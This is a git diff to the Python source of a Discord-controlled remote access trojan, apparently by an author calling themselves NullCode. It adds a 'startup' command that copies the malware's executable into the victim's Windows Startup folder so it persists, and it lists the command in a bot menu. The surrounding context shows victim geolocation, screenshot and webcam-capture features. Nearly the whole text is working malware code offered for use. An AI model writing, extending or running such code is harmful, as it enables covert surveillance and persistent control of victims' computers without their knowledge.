@@ -110,6 +110,19 @@ async def geolocate(ctx):
     embed.set_footer(text="Written by NullCode#7040")
     await ctx.send(embed=embed)
 
+# Initial startup command
+@client.command()
+async def startup(ctx):
+    from sys import executable
+    await ctx.send("Last known RAT directory: `" + ogdir + "` \nCurrent Directory: `" + os.getcwd() + "`")
+    os.chdir(ogdir)
+    await ctx.send("\nTrying to copy self into startup directory...")
+    modded_startup = os.path.basename(executable)
+    print('copy "' + modded_startup + '" "' + os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" + '"')
+    os.system('copy "' + modded_startup + '" "' + os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" + '"')
+    os.chdir(os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+    await ctx.send("If you see the program here, you're good to go: " + str(os.listdir()))
+    
 @client.command()  # Idea was Sp00p's, but this is a brand new implementation by me
 async def webcam(ctx):
     import base64
@@ -323,6 +336,7 @@ async def menu(ctx):
     embed.add_field(name="rat> cwd", value="Sends current working directory", inline=False)
     embed.add_field(name="rat> screenshot", value="Takes screenshot of monitor", inline=False)
     embed.add_field(name="rat> webcam", value="Takes picture from webcam", inline=False)
+    embed.add_field(name="rat> startup", value="[EXPERIMENTAL] Add payload to victim's startup", inline=False)
     embed.add_field(name="rat> exit <ip>", value="Shuts down bot", inline=False)
     embed.set_footer(text="Written by NullCode#7040")
     await ctx.send(embed=embed)
